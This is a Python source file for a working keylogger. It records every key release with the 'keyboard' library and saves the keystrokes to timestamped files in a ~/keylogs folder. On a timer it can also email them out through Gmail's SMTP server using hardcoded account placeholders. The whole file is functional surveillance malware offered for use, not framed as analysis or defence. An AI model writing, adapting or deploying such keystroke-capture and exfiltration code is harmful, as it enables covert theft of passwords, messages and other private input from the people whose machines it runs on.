import json
import os
import smtplib
from datetime import datetime
from threading import Timer

import keyboard  # for keylogger
import psutil as psutil

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "hj"
EMAIL_PASSWORD = ""


class Keylogger:
    def __init__(self, interval, report_method="file", save_location=os.path.expanduser('~/keylogs'), debug=False):
        self.debug = debug

        self.filename = ''
        self.last_filename = ''
        self.save_location = save_location
        if self.save_location[-1] not in ('\\', '/'):
            self.save_location += '/'
        if self.debug and not os.path.isdir(f'{self.save_location}debug_info/'):
            print('pass')
            os.mkdir(f'{self.save_location}debug_info/')

        self.current_memory_usage = 0
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        self.report_memory_usage('start')

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occurred
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.report_memory_usage('callback')
        self.log += name

    def report_memory_usage(self, user):
        if self.debug:
            self.current_memory_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2
            memory_report = {
                "user": user,
                "time": str(datetime.now()),
                "memory": self.current_memory_usage
            }
            print(json.dumps(memory_report, indent=1))
            with open(f'{self.save_location}debug_info/memory_usage.json', 'a') as f:
                f.write(f'\n{memory_report}')

    def update_filename(self):
        self.last_filename = self.filename
        # construct the filename to be identified by start & end datetime
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"{self.save_location}keylogger-{self.start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keyloggers in the `self.log` variable"""
        # open the file in write mode (create it)
        if self.last_filename != '':
            with open(f'{self.last_filename}.txt', 'r') as f:
                self.log = f.read() + self.log
                self.report_memory_usage('old_file_open')
            os.remove(f'{self.last_filename}.txt')
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            self.report_memory_usage('new_file_open')
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    @staticmethod
    def sendmail(email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log != '':
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.log = ''

        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        keyboard.wait()
